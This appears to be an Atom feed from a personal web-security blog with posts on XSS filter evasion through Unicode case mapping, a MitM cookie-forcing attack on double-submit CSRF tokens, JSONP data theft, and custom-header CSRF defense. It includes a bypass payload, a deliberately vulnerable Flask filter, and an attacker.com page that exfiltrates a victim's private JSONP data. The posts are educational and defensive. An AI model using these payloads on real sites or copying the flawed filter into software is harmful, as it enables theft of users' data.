<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[ahmsec]]></title>
  <link href="http://ahmsec.github.io/atom.xml" rel="self"/>
  <link href="http://ahmsec.github.io/"/>
  <updated>2018-11-22T12:57:21-08:00</updated>
  <id>http://ahmsec.github.io/</id>
  <author>
    <name><![CDATA[Ahmad Khan]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[XSS Filter Evasion via Case Change]]></title>
    <link href="http://ahmsec.github.io/blog/2018/11/22/xss-filter-evasion-via-case-change/"/>
    <updated>2018-11-22T13:00:00-08:00</updated>
    <id>http://ahmsec.github.io/blog/2018/11/22/xss-filter-evasion-via-case-change</id>
    <content type="html"><![CDATA[<p><a href="https://twitter.com/x00x90_/status/1060397253024727040">This</a> tweet describes an interesting behavior: certain non-ASCII characters map to ASCII characters when converted to upper- or lower-case. Specifically:</p>

<pre><code>ı (\u0131) to upper-case --&gt; I
ſ (\u017f) to upper-case --&gt; S
İ (\u0130) to lower-case --&gt; i
K (\u212a) to lower-case --&gt; k
</code></pre>

<p>This can help bypass XSS filters or blacklists. For example, the filter in the app below can be bypassed by <code>?name=&lt;ſcript src="http://ahmsec.github.io/alert1.js"&gt;&lt;/script&gt;</code>.</p>

<figure class='code'><figcaption><span>vulnerable-app.py</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">Response</span>
</span><span class='line'><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="nd">@app.route</span><span class="p">(</span><span class="s">&quot;/&quot;</span><span class="p">)</span>
</span><span class='line'><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
</span><span class='line'>    <span class="n">name</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">&#39;name&#39;</span><span class="p">)</span> <span class="ow">or</span> <span class="s">&#39;guest&#39;</span>
</span><span class='line'>    <span class="k">if</span> <span class="s">&#39;&lt;script&#39;</span> <span class="ow">in</span> <span class="n">name</span><span class="o">.</span><span class="n">lower</span><span class="p">():</span>
</span><span class='line'>        <span class="k">return</span> <span class="s">&#39;XSS DENIED!&#39;</span>
</span><span class='line'>    <span class="k">return</span> <span class="s">&#39;&lt;html&gt;Welcome, &#39;</span> <span class="o">+</span> <span class="n">name</span><span class="o">.</span><span class="n">upper</span><span class="p">()</span> <span class="o">+</span> <span class="s">&#39;!&lt;/html&gt;&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="nd">@app.route</span><span class="p">(</span><span class="s">&quot;/ALERT1.JS&quot;</span><span class="p">)</span> <span class="c">#normally hosted on attacker site</span>
</span><span class='line'><span class="k">def</span> <span class="nf">alert1</span><span class="p">():</span>
</span><span class='line'>    <span class="k">return</span> <span class="s">&#39;alert(1)&#39;</span>
</span></code></pre></td></tr></table></div></figure>


<p>As usual, the best practice for XSS prevention is <a href="https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet">character encoding</a>.</p>

<p>Here is a quick script to enumerate characters affected by this behavior. Interestingly, it appears that Python 2 and 3 treat <code>İ (\u0130)</code> differently.</p>

<figure class='code'><figcaption><span>casing-xss.py</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'>
</span><span class='line'><span class="n">interestingChars</span> <span class="o">=</span> <span class="p">[</span><span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">65</span><span class="p">,</span><span class="mi">91</span><span class="p">)]</span> <span class="o">+</span> <span class="p">[</span><span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">97</span><span class="p">,</span><span class="mi">123</span><span class="p">)]</span>
</span><span class='line'>
</span><span class='line'><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x10FFFF</span><span class="o">+</span><span class="mi">1</span><span class="p">):</span>
</span><span class='line'>    <span class="n">char</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;i&#39;</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">&#39;utf-32&#39;</span><span class="p">,</span> <span class="s">&#39;surrogatepass&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">charLower</span> <span class="o">=</span> <span class="n">char</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">charLower</span> <span class="ow">in</span> <span class="n">interestingChars</span> <span class="ow">and</span> <span class="n">char</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">interestingChars</span><span class="p">:</span>
</span><span class='line'>        <span class="k">print</span><span class="p">(</span><span class="s">&#39;{} ({}) to lower-case --&gt; {}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">char</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">&#39;utf8&#39;</span><span class="p">),</span> <span class="nb">repr</span><span class="p">(</span><span class="n">char</span><span class="p">),</span> <span class="n">charLower</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">charUpper</span> <span class="o">=</span> <span class="n">char</span><span class="o">.</span><span class="n">upper</span><span class="p">()</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">charUpper</span> <span class="ow">in</span> <span class="n">interestingChars</span> <span class="ow">and</span> <span class="n">char</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">interestingChars</span><span class="p">:</span>
</span><span class='line'>        <span class="k">print</span><span class="p">(</span><span class="s">&#39;{} ({}) to upper-case --&gt; {}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">char</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">&#39;utf8&#39;</span><span class="p">),</span> <span class="nb">repr</span><span class="p">(</span><span class="n">char</span><span class="p">),</span> <span class="n">charUpper</span><span class="p">))</span>
</span></code></pre></td></tr></table></div></figure>


<p></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[CSRF: Double Submit Cookies Insufficient Against MitM]]></title>
    <link href="http://ahmsec.github.io/blog/2016/08/31/csrf-double-submit-cookies-insufficient-against-mitm/"/>
    <updated>2016-08-31T08:38:05-07:00</updated>
    <id>http://ahmsec.github.io/blog/2016/08/31/csrf-double-submit-cookies-insufficient-against-mitm</id>
    <content type="html"><![CDATA[<p>Suppose you’re at the latest hip coffee shop in town, enjoying their comfy chairs and high-speed wifi. You’re doing some confidential work using a relatively secure web application. The application always uses TLS, redirects HTTP requests back to HTTPS, and deploys <a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29_Prevention_Cheat_Sheet#Double_Submit_Cookie">Double Submit Cookies</a> (with the ‘secure’ cookie flag) to protect from CSRF. Now suppose that the coffee shop staff becomes part of your threat model. Could they still launch CSRF attacks against you? After all, they can’t read TLS-encrypted traffic, so they can’t possibly steal CSRF tokens.</p>

<p>It turns out that actually yes, given the scenario above, a man-in-the-middle (with your pick of malicious staff, rogue access point, or ARP poisoning) can defeat the Double Submit defense. And it’s a simple attack, not one that requires you to break TLS or WPA2. Here’s how it works:</p>

<ol>
<li>Victim conducts secret business on <a href="https://secret.example.com">https://secret.example.com</a> (MitM attacker can’t read this traffic.)</li>
<li>Victim visits a non-SSL website like <a href="http://stackoverflow.com">http://stackoverflow.com</a> or <a href="http://www.cnn.com">http://www.cnn.com</a> (MitM can read and modify this traffic.)</li>
<li>MitM injects <code>&lt;img src=”http://secret.example.com/non-existent.png”/&gt;</code> into the response from (2). Note that the img tag’s protocol is HTTP and not HTTPS.</li>
<li>Victim’s browser receives the image tag, and sends a secondary non-SSL request to <a href="http://secret.example.com/non-existent.png.">http://secret.example.com/non-existent.png.</a> (CSRF cookie not sent because of secure flag.)</li>
<li>MitM intercepts the response from <a href="http://secret.example.com,">http://secret.example.com,</a> which could be a 301 redirect [1] or a 404 error, and injects a Set-Cookie header that overwrites the victim’s CSRF cookie with a known value. Details on how later.</li>
<li>Since the attacker knows the CSRF cookie value, he or she can now trigger a request that includes the CSRF token in the body.</li>
</ol>


<p>All of this can be automated for your exploit. A non-intuitive step in this attack scenario is perhaps #5. How could a non-SSL response possibly overwrite cookies that have the ‘secure’ flag and that were set under SSL? That unfortunately is allowed by design and is how the web works today. Here’s an article that describes the issue: <a href="http://scarybeastsecurity.blogspot.com/2008/11/cookie-forcing.html">http://scarybeastsecurity.blogspot.com/2008/11/cookie-forcing.html</a> .</p>

<p>One way to protect against this scenario is to use HSTS. However, you have to make sure that every single subdomain has HSTS, because any child subdomain can be used to set cookies for the top-level parent domain, and those cookies will subsequently be sent with requests to every subdomain. You also have make sure you don’t have users on browsers without <a href="http://caniuse.com/#feat=stricttransportsecurity">HSTS support</a>, such as IE &lt; v11.</p>

<p>A few takeaways:</p>

<ol>
<li>Double Submit Cookies are a common way to protect against CSRF. They’re recommended by OWASP and used by several websites and frameworks. However, if you need to protect against MitM, you should consider a different defense.</li>
<li>Cookies should be treated as untrusted and attacker-controlled input. Be careful of mistakes like allowing user-generated session cookies and not sanitizing cookie-sourced values for XSS.</li>
</ol>


<p>For further discussion on these topics, please see the following articles. <br/>
&nbsp;&nbsp;&nbsp;&nbsp; - <a href="http://scarybeastsecurity.blogspot.com/2008/11/cookie-forcing.html">http://scarybeastsecurity.blogspot.com/2008/11/cookie-forcing.html</a><br/>
&nbsp;&nbsp;&nbsp;&nbsp; - <a href="https://media.blackhat.com/eu-13/briefings/Lundeen/bh-eu-13-deputies-still-confused-lundeen-wp.pdf">https://media.blackhat.com/eu-13/briefings/Lundeen/bh-eu-13-deputies-still-confused-lundeen-wp.pdf</a></p>

<hr />

<p>[1] For a workaround to browsers’ aggressive caching of 301 redirects, see <a href="http://security.stackexchange.com/a/117138.">http://security.stackexchange.com/a/117138.</a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[The Dangers of JSONP]]></title>
    <link href="http://ahmsec.github.io/blog/2016/07/05/the-dangers-of-jsonp/"/>
    <updated>2016-07-05T16:34:03-05:00</updated>
    <id>http://ahmsec.github.io/blog/2016/07/05/the-dangers-of-jsonp</id>
    <content type="html"><![CDATA[<p>This post is about how I learned of JSONP as an attack vector. This isn&rsquo;t a new vulnerability, but it&rsquo;s just nice that I discovered it on my own.</p>

<h3>A note on Same-Origin Policy</h3>

<p>Same-Origin Policy (SOP) prevents a webpage from reading data on a different domain. So if you open a tab with hacker.com, your browser won&rsquo;t let it read data on bank.com. There are notable exceptions, like <code>&lt;img&gt;</code> and <code>&lt;script&gt;</code> tags. However, browsers strictly limit their scope. For example, a webpage can only execute a cross-domain script, not read its contents.</p>

<h3>Some interesting behavior</h3>

<p>Playing with traffic in Burp I observed the following behavior. Whatever you pass in the &ldquo;callback&rdquo; parameter is reflected in the response.</p>

<p>Request: <code>GET /sensitive_resource?callback=myFunction</code> <br/>
Response: <code>myFunction({"key1":"data1", "key2":"data2", ...})</code></p>

<p>Request: <code>GET /sensitive_resource?callback=AAAAAAAA</code> <br/>
Response: <code>AAAAAAAA({"key1":"data1", "key2":"data2", ...})</code></p>

<p>My first instinct was to test for XSS, but all output was correctly encoded. The response contained private data, but it required an authenticated session to access.</p>

<p>(Later on I learned that this request/response behavior is an old technique called JSONP. It was used to get around Same-Origin Policy restrictions before CORS came about.)</p>

<h3>The exploit</h3>

<p>What if we request that resource from a <code>&lt;script&gt;</code> tag on the attacker&rsquo;s webpage? Notice that the response data is wrapped with a JavaScript function call that we control. Can we pre-define that function on the attacker&rsquo;s webpage?</p>

<p><strong>www.attacker.com:</strong></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;script&gt;</span>
</span><span class='line'><span class="kd">var</span> <span class="nx">exfil_function</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="nx">parsed_data</span> <span class="o">=</span> <span class="nx">response_specific_parsing</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
</span><span class='line'>  <span class="nx">alert</span><span class="p">(</span><span class="nx">parsed_data</span><span class="p">);</span>
</span><span class='line'>  <span class="nx">exfil</span><span class="p">(</span><span class="nx">parsed_data</span><span class="p">);</span>
</span><span class='line'><span class="p">};</span>
</span><span class='line'><span class="nt">&lt;/script&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;script </span><span class="na">src=</span><span class="s">&quot;https://www.victim.com/sensitive_resource?callback=exfil_function&quot;</span><span class="nt">&gt;</span> <span class="nt">&lt;/script&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>And it works! The cross-domain script executes <code>exfil_function({"key1":"data1", "key2":"data2", ...})</code>, and since we control the definition of <code>exfil_function</code>, we can have it read the data!</p>

<p>Now when an authenticated victim views this malicious webpage, it does a cross-domain read of the sensitive resource and exfiltrates the private data.</p>

<h3>Lesson: don&rsquo;t use JSONP with private data</h3>

<p>JSONP effectively disables Same-Origin Policy for a resource. So be cautious of using it with private data. Instead, use CORS, which gives you fine-grained and securely designed control over cross-origin sharing.</p>

<p>A slightly related vulnerability is <a href="http://haacked.com/archive/2009/06/25/json-hijacking.aspx/">JSON Hijacking</a>. In conclusion, do not return sensitive data wrapped in JavaScript functions or arrays.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Custom Headers as CSRF Defense]]></title>
    <link href="http://ahmsec.github.io/blog/2016/07/03/custom-headers-as-csrf-defense/"/>
    <updated>2016-07-03T16:18:01-07:00</updated>
    <id>http://ahmsec.github.io/blog/2016/07/03/custom-headers-as-csrf-defense</id>
    <content type="html"><![CDATA[<p>CSRF is a prevalent and well-known vulnerability that affects web applications. The common way to protect against CSRF is to require anti-CSRF tokens on state-modifying requests. For defense in depth, you can add an extra layer of security by additionally requiring custom headers. This can mitigate scenarios where anti-CSRF tokens are somehow leaked (something I have seen happen).</p>

<h3>Simple vs Preflighted Requests</h3>

<p>The Mozilla <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Access_control_CORS">article</a> on CORS does a nice job of explaining the difference between &ldquo;simple&rdquo; and &ldquo;preflighted&rdquo; requests.</p>

<ul>
<li><p><strong>Simple requests</strong> are sent by traditional mechanisms on the web, such as GETs made by <code>&lt;img&gt;</code> tags or POSTs made by HTML forms. The browser will always send them cross-origin, and will always pass along session cookies. This behavior is what makes CSRF possible.</p></li>
<li><p><strong>Preflighted requests</strong> are requests that either contain custom headers or use methods other than GET, POST, or HEAD. Browsers will refuse to send these requests cross-origin unless the server explicitly allows it. To check this permission, browsers will send a &ldquo;pre-flight&rdquo; OPTIONS request before sending the actual request, and the server has to reply with the appropriate CORS headers. If the server doesn&rsquo;t, the actual request is never sent.</p></li>
</ul>


<p> Note the difference: simple requests are always sent cross-origin, even though Same-Origin Policy blocks the responses. When preflighted, the request isn&rsquo;t even sent in the first place.</p>

<h3>Preflighted Requests and CSRF</h3>

<p>If a resource requires a non-standard header or method, it won&rsquo;t be sent cross-origin (unless the victim domain for some reason whitelists the attacker domain). Since the request is never sent, CSRF attacks are blocked.</p>

<h3>Bypassing Custom Header Restrictions</h3>

<p>While requiring custom headers is a useful layer of CSRF defense, it shouldn&rsquo;t be the only one. Up until March 2015, Adobe Flash had a vulnerability that allowed you to send custom headers cross-origin. Here are two well-written posts describing the technique:</p>

<ul>
<li> <a href="http://lists.webappsec.org/pipermail/websecurity_lists.webappsec.org/2011-February/007533.html">http://lists.webappsec.org/pipermail/websecurity_lists.webappsec.org/2011-February/007533.html</a></li>
<li> <a href="http://www.appsecweekly.com/flash-same-origin-policy-bypass-with-307/">http://www.appsecweekly.com/flash-same-origin-policy-bypass-with-307/</a></li>
</ul>


<h3>Conclusion</h3>

<p>Consider requiring custom headers on your sensitive state-modifying requests. For example, you can require an X-Requested-With header on AJAX calls and refuse to honor those that don&rsquo;t include it.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[First Post!]]></title>
    <link href="http://ahmsec.github.io/blog/2016/06/24/first-post/"/>
    <updated>2016-06-24T07:15:45-07:00</updated>
    <id>http://ahmsec.github.io/blog/2016/06/24/first-post</id>
    <content type="html"><![CDATA[<p>I know you&rsquo;ve been waiting eagerly, but it&rsquo;s finally here: my own personal blog! &hellip; Just kidding, I can hear the crickets chirping. This is intended to be an informal space for me to write about topics of interest. Mostly technical posts about what I&rsquo;m learning in &ldquo;cyber&rdquo; security (to use the current vernacular). Perhaps other topics as well. If future generations come across these posts and benefit, that will be great!</p>
]]></content>
  </entry>
  
</feed>
